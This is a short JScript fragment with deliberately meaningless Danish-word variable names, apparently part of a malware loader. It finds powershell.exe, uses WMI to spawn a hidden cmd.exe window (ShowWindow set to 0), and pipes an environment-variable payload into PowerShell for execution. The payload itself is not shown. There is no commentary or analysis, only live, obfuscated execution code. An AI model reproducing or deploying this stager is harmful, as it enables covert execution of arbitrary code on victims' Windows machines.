Toilettepragt = new ActiveXObject("Scripting.FileSystemObject");
Nedlggende="c:/windows/syswow64/WindowsPowerShell/v1.0/powershell.exe"
Nedlggende = Toilettepragt.FileExists(Nedlggende) ? Nedlggende = Nedlggende.split('/').join('\\') : "c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe";
Codificerer="cmd.exe /d /c echo ^%Bilejeren^% | %Endogenae% -";
Strabadsering27="SystemRoot=C:\\Windows";
Chefdelegerede = GetObject("winmgmts://./root/cimv2");
Aftvingelsers = Chefdelegerede.Get("Win32_ProcessStartup").SpawnInstance_();
Aftvingelsers.ShowWindow = 0
Aftvingelsers.EnvironmentVariables = [Strabadsering27,"Bilejeren="+Apotekerforeningen,"Endogenae=" + Nedlggende];
Sooper = Chefdelegerede.Get("Win32_Process");
Stabschefer = Sooper.Create(Codificerer,null,Aftvingelsers,null);